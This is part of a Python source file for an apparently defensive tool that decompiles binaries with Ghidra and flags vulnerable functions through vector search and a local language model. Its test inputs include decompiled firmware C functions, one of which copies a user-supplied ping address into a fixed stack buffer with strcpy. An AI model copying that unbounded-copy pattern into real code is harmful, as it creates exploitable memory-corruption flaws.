            list_of_decom_files.append({"binary_name": binary_name, "function_name": function_name, "code": self._get_code_from_decom_file(file_path)})
        return list_of_decom_files
    
    # def _generate_dialogue_response(self, model, tokenizer, device, messages):
    #     encodeds = tokenizer.apply_chat_template(messages, return_tensors="pt")
    #     model_inputs = encodeds.to(device)
    #     generated_ids = model.generate(model_inputs,max_new_tokens=512, do_sample=False, pad_token_id=50256  )# do_sample随机性# pad_token_id=50256 是 GPT-2 的 </s> 终止符
    #     decoded = tokenizer.batch_decode(generated_ids, skip_special_tokens=False)
    #     return decoded[0]
    


    def _generate_table_row(self, binary_name="", function_name="", explanation=0):
        return {
            "binary_name": str(binary_name),
            "function_name": function_name,
            "explanation": str(explanation),
        }
    def _generate_table(self, rows, title=None):
        table = Table()

        for column_name in rows[0].keys():
            table.add_column(str(column_name).upper().replace("_", " "))

        for row_dict in rows:
            table.add_row(*row_dict.values())

        table.caption = "Zhuzhao"

        if title:
            formatted_title = " ".join(word.capitalize() for word in title.split())
            table.title = f"[red bold underline]{formatted_title}[/red bold underline]"

        return table  

    def _get_args(self):
        parser = argparse.ArgumentParser(description="Local Language Model (LLM) - 二进制漏洞检测")
        parser.add_argument("--binary", "-b", required=True, help="The Binary to search")
        return parser.parse_args() 

    def _remove_inst_tags(self, text):   
        pattern = r'\[INST\].*?\[/INST\]'
        clean_text = re.sub(pattern, '', text, flags=re.DOTALL)
        return clean_text.replace("<s>", "").replace("</s>", "").strip()
    
    def entry(self):
        faiss = "vulnerability_index.faiss"
        datasets = "vuln_db_vector.jsonl"
        args = self._get_args()
        console = Console()
        index, metadata = self._load_faiss_index(faiss,datasets)
        encoder, codebert_tokenizer, codebert_model, mistral_tokenizer, mistral_model = self._load_model()
        
        list_of_decom_files = []
        with tempfile.TemporaryDirectory() as tmpdirname:
            with console.status("Decompiling binary...") as status:
                list_of_decom_files = self._decompile_binary(tmpdirname, args.binary)
                console.print("Processing finished!")

            with Live(Table(), refresh_per_second=4, console=console) as live:
                rows = []    

                for function in list_of_decom_files:
                    binary_name = function["binary_name"]
                    function_name = function["function_name"]
                    code = function["code"]
                    console.print(f"[green] {code}")
                    query_code = code
                    filtered_candidates = self._bm25_filter(query_code, metadata, top_k=10)
                    best_match = self._search_vulnerability(query_code, index, metadata, encoder, codebert_tokenizer, codebert_model)
                    if best_match:
                        console.print("[red][+] 匹配到已知漏洞:")
                        console.print("[red]" + self._format_vulnerability_output(best_match))
                    else:
                        print("[+] 进入大模型分析...")
                        analysis = self._analyze_with_mistral(query_code, mistral_tokenizer, mistral_model)
                        print("[+] 大模型分析结果:")
                        print(analysis)                 


    def testentry(self):
        index, metadata = self._load_faiss_index("vulnerability_index.faiss", "vuln_db_augmented2.jsonl")
        encoder, codebert_tokenizer, codebert_model, mistral_tokenizer, mistral_model = self._load_model()
        query_code = """
    int **fastcall** sub_E9A1F8(int param1, int param2, int param3)\n{\n  const char *var_str; // $s1\n  const char *UserStringData; // $s2\n  int NumericData; // $s3\n  const char *HashKey; // $s4\n  int ErrorCode; // $v0\n  int SubResult; // $a0\n  int NetworkCheckCode; // $v0\n  unsigned int TotalCount; // $a1\n  int TempValue; // $v0\n  long HashFunctionValue; // $v1\n  unsigned int SubNetworkFlag; // $v0\n  unsigned int UserCount; // [sp+10h] [-A0h] BYREF\n  _DWORD HashTable[2]; // [sp+14h] [-9Ch] BYREF\n  unsigned char UserInputData[128]; // [sp+1Ch] [-94h] BYREF\n\n  memset(UserInputData, 0, sizeof(UserInputData));\n  UserCount = 0;\n  var_str = cJSON_Print(param2);\n  printf(\"%s\", var_str);\n  free(var_str);\n  UserStringData = cJSON_GetObjectStringValue(param2, \"email\", \"guest@unknown.com\");\n  NumericData = cJSON_GetObjectIntValue(param2, \"count\", 5);\n  HashKey = cJSON_GetObjectStringValue(param2, \"hash\", &dword_EF0310);\n  td_console_log(\"data_validate key = %s count = %d hash = %s\\n\", UserStringData, NumericData, HashKey);\n  snprintf(UserInputData, sizeof(UserInputData), \"%s%d%s\", UserStringData, NumericData, \"EMAIL-SYSTEM\");\n  if ( sub_E9A9A8(UserInputData, HashKey) )\n  {\n    ErrorCode = cJSON_CreateNumber(0, 0);\n    cJSON_AddItemToObject(param3, \"status\", ErrorCode);\n    SubResult = -1073741824;\n  }\n  else\n  {\n    HashTable[0] = *(unsigned int *)UserStringData;\n    HashTable[1] = NumericData;\n    if ( network_ping(HashTable, &UserCount) == 1 )\n    {\n      td_console_log(\"network_ping error !\\n\");\n      NetworkCheckCode = cJSON_CreateNumber(0, 0);\n      cJSON_AddItemToObject(param3, \"status\", NetworkCheckCode);\n      SubResult = -1074790400;\n    }\n    else\n    {\n      HashFunctionValue = td_console_log(\"network check ok, hash:%d\\n\", TotalCount);\n      SubNetworkFlag = cJSON_CreateNumber(HASH_CODE(HashFunctionValue), HashFunctionValue);\n      cJSON_AddItemToObject(param3, \"status\", SubNetworkFlag);\n      SubResult = 0;\n    }\n  }\n  TempValue = cJSON_CreateNumber(SubResult, 0);\n  cJSON_AddItemToObject(param3, \"result_code\", TempValue);\n  return stack_guard_variable;\n}    
    """

        filtered_candidates = self._bm25_filter(query_code, metadata, top_k=10)
        best_match = self._search_vulnerability(query_code, index, metadata, encoder, codebert_tokenizer, codebert_model)

        if best_match:
            print("[+] 匹配到已知漏洞:")
            print(self._format_vulnerability_output(best_match))
        else:
            print("[+] 进入大模型分析...")
            analysis = self._analyze_with_mistral(query_code, mistral_tokenizer, mistral_model)
            print("[+] 大模型分析结果:")
            print(analysis)

    def testfunc(self):
        
        import time
        console = Console()
        console.log("hello")
        # console.status()
        # for i in track(range(10), description="处理数据中..."):
        #     time.sleep(0.5)
        with console.status("Decompiling binary...") as status:
            time.sleep(50)

def run():
    finder = Zhuzhao()
    finder.entry()

if __name__ == "__main__":
    run()






# model = AutoModelForCausalLM.from_pretrained("./fine-tuned-model", device_map="auto").to("cuda")
# tokenizer = AutoTokenizer.from_pretrained("./fine-tuned-model")

# if tokenizer.pad_token is None:
#     tokenizer.pad_token = tokenizer.eos_token  
#     tokenizer.pad_token_id = tokenizer.eos_token_id

# def test_model(input_text):
#     inputs = tokenizer(
#         input_text, 
#         return_tensors="pt", 
#         padding=True,  
#         truncation=True,
#         max_length=4096 
#     ).to("cuda")

#     output_ids = model.generate(
#         input_ids=inputs.input_ids, 
#         attention_mask=inputs.attention_mask,
#         max_length=4096,  # ✅ 控制生成长度，防止溢出
#         do_sample=True,  # ✅ 允许采样，提升结果多样性
#         top_k=50,  # 🚀 只考虑概率最高的 50 个 token
#         temperature=0.7,  # ✅ 控制随机性，防止生成无意义文本
#         num_return_sequences=1
#     )

#     return tokenizer.decode(output_ids[0], skip_special_tokens=True)

# # ✅ 5. 测试输入
# test_input = """
# void FUN_0041da20(undefined4 param_1,undefined4 param_2,undefined4 param_3)\n\n{\n  char *pcVar1;\n  int iVar2;\n  int iVar3;\n  undefined4 uVar4;\n  char *pcVar5;\n  int local_11c4 [3];\n  int local_11b8;\n  char acStack_11b4 [64];\n  char local_1174 [4];\n  char local_1170 [4];\n  undefined4 local_116c;\n  undefined4 local_1168;\n  undefined4 local_1164;\n  undefined4 local_1160;\n  char local_115c [16];\n  undefined4 local_114c;\n  undefined4 local_1148;\n  undefined4 local_1144;\n  undefined4 local_1140;\n  undefined4 local_113c;\n  undefined4 local_1138;\n  undefined4 local_1134;\n  undefined4 local_1130;\n  char acStack_112c [64];\n  undefined1 auStack_10ec [64];\n  undefined1 auStack_10ac [64];\n  undefined1 auStack_106c [64];\n  char acStack_102c [4096];\n  int local_2c;\n  \n  local_2c = __stack_chk_guard;\n  pcVar1 = (char *)cJSON_GetObjectStringValue(param_2,\"pingIp\",\"0.0.0.0\");\n  cJSON_GetObjectIntValue(param_2,\"pingNum\",1);\n  iVar2 = cJSON_GetObjectIntValue(param_2,\"pingSize\",0x20);\n  local_1174[0] = '4';\n  local_1174[1] = '\u0000';\n  local_1170[0] = '3';\n  local_1170[1] = '\u0000';\n  memset(acStack_102c,0,0x1000);\n  iVar3 = cJSON_CreateObject();\n  if (iVar3 != 0) {\n    memset(acStack_112c,0,0x40);\n    strcpy(acStack_112c,pcVar1);\n    if (iVar2 < 4) {\n      iVar2 = 0x20;\n    }\n    strcpy(acStack_11b4,acStack_112c);\n    local_11c4[1] = 1;\n    local_11c4[2] = iVar2;\n    local_11c4[0] = atoi(local_1174);\n    local_11b8 = atoi(local_1170);\n    iVar2 = cmd_get_ping_output(local_11c4,acStack_102c,0x1000);\n    if (iVar2 != 0) {\n      uVar4 = cJSON_CreateString(acStack_112c);\n      cJSON_AddItemToObject(iVar3,\"pingIp\",uVar4);\n      uVar4 = cJSON_CreateString(\"-1\");\n      cJSON_AddItemToObject(iVar3,&DAT_0046d3e8,uVar4);\n      uVar4 = cJSON_CreateString(\"-1\");\n      cJSON_AddItemToObject(iVar3,&DAT_0046f74c,uVar4);\n    }\n    pcVar1 = strstr(acStack_102c,\"ttl\");\n    if (pcVar1 == (char *)0x0) {\n      uVar4 = cJSON_CreateString(acStack_112c);\n      cJSON_AddItemToObject(iVar3,\"pingIp\",uVar4);\n      uVar4 = cJSON_CreateString(\"-1\");\n      cJSON_AddItemToObject(iVar3,&DAT_0046d3e8,uVar4);\n      uVar4 = cJSON_CreateString(\"-1\");\n      cJSON_AddItemToObject(iVar3,&DAT_0046f74c,uVar4);\n    }\n    else {\n      strtok(acStack_102c,\"\n\");\n      while (pcVar1 = strtok((char *)0x0,\"\n\"), pcVar1 != (char *)0x0) {\n        local_116c = 0;\n        local_1168 = 0;\n        local_1164 = 0;\n        local_1160 = 0;\n        local_115c[0] = '\u0000';\n        local_115c[1] = '\u0000';\n        local_115c[2] = '\u0000';\n        local_115c[3] = '\u0000';\n        local_115c[4] = '\u0000';\n        local_115c[5] = '\u0000';\n        local_115c[6] = '\u0000';\n        local_115c[7] = '\u0000';\n        local_115c[8] = '\u0000';\n        local_115c[9] = '\u0000';\n        local_115c[10] = '\u0000';\n        local_115c[0xb] = '\u0000';\n        local_115c[0xc] = '\u0000';\n        local_115c[0xd] = '\u0000';\n        local_115c[0xe] = '\u0000';\n        local_115c[0xf] = '\u0000';\n        local_114c = 0;\n        local_1148 = 0;\n        local_1144 = 0;\n        local_1140 = 0;\n        memset(auStack_10ec,0,0x40);\n        memset(auStack_10ac,0,0x40);\n        memset(auStack_106c,0,0x40);\n        local_113c = 0;\n        local_1138 = 0;\n        local_1134 = 0;\n        local_1130 = 0;\n        pcVar5 = strstr(pcVar1,\"ttl\");\n        if (pcVar5 != (char *)0x0) {\n          sscanf(pcVar1,\"%*d %*s %*s %[^:]:%[^=]=%[^ ] %[^=]=%[^ ] %[^=]=%[^ ] \",&local_113c,\n                 auStack_10ec,&local_116c,auStack_10ac,local_115c,auStack_106c,&local_114c);\n          if (local_114c._0_1_ == '\u0000' && local_115c[0] == '\u0000') {\n            uVar4 = cJSON_CreateString(acStack_112c);\n            cJSON_AddItemToObject(iVar3,\"pingIp\",uVar4);\n            uVar4 = cJSON_CreateString(\"-1\");\n            cJSON_AddItemToObject(iVar3,&DAT_0046d3e8,uVar4);\n            pcVar1 = \"-1\";\n          }\n          else {\n            uVar4 = cJSON_CreateString(&local_113c);\n            cJSON_AddItemToObject(iVar3,\"pingIp\",uVar4);\n            uVar4 = cJSON_CreateString(&local_114c);\n            cJSON_AddItemToObject(iVar3,&DAT_0046d3e8,uVar4);\n            pcVar1 = local_115c;\n          }\n          uVar4 = cJSON_CreateString(pcVar1);\n          cJSON_AddItemToObject(iVar3,&DAT_0046f74c,uVar4);\n        }\n      }\n    }\n    cJSON_AddItemToObject(param_3,\"pingSet\",iVar3);\n  }\n  if (local_2c == __stack_chk_guard) {\n    return;\n  }\n                    /* WARNING: Subroutine does not return */\n  __stack_chk_fail();\n}
# """

# # ✅ 6. 运行测试
# print("模型分析结果:", test_model(test_input))

# def get_code_from_decom_file(path_to_file):
#     """
#     Read and return the code from a decom file.

#     Args:
#         path_to_file (str): Path to the decom file.

#     Returns:
#         str: Content of the decom file.
#     """
#     with open(path_to_file, "r") as file:
#         return file.read()

# def decompile_binary(decom_folder, binary):
#         """
#         Decompile the binary file and extract function information.

#         Args:
#             decom_folder (str): Folder to store decompiled files.
#             binary (str): Path to the binary file.

#         Returns:
#             list: List of dictionaries containing binary name, function name, and code.
#         """
#         g_bridge = GhidraBridge()
#         g_bridge.decompile_binaries_functions(binary, decom_folder)
        
#         list_of_decom_files = []

#         for file_path in Path(decom_folder).iterdir():
#             binary_name, function_name, *_ = Path(file_path).name.split("__")
#             list_of_decom_files.append({"binary_name": binary_name, "function_name": function_name, "code": get_code_from_decom_file(file_path)})
#             print(list_of_decom_files)
#         return list_of_decom_files


# # decompile_binary("./test","./httpd")
# print(get_code_from_decom_file("./test/httpd__cgi_ucloud_sys_basic_info_get__1741679384.c"))
```

